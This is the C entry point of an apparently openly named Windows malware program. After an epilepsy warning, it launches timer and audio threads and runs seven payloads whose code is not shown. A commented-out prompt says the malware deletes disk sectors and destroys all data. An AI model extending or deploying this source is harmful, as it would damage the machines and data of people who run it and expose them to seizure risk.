#include <Windows.h>
#include "payload.h"
#include "timer.h"

VOID WINAPI InitDPI() {
	HMODULE hModUser32 = LoadLibraryW(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);
}

INT WINAPI wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pszCmdLine,
	_In_ INT nShowCmd
) {
	InitDPI();
	/*LOL
	if (MessageBoxW(NULL, L"This is a malware.\n\This malware will delete your sectors, and you will lose all your data in your computer.\n\If you know what this malware will do,\n\Click Yes to execute.", L"WARNING", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}
	LOL*/
	if (MessageBoxW(NULL, L"If you don't have photosensitive epilepsy,\n\click yes to execute.", L"WARNING", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}
	Sleep(3000);
	//SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	//CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)EnumWindowProc, 0, 0, NULL);
	//CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)CursorMess, 0, 0, NULL);
	//CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)RandomPop, 0, 0, NULL);
	CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)InitializeTimer, 1000, 0, NULL);
	CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)AudioThread, 0, 0, NULL);
	//Sleep(INFINITE);
	ExecutePayload(Payload1, 30);
	ExecutePayload(Payload2, 30);
	ExecutePayload(Payload3, 30);
	ExecutePayload(Payload4A, 30);
	ExecutePayload(Payload5, 30);
	ExecutePayload(Payload6, 30);
	ExecutePayload(Payload7, 30);
	//ExecuteShader(Shader1, 10);
	return 0;
}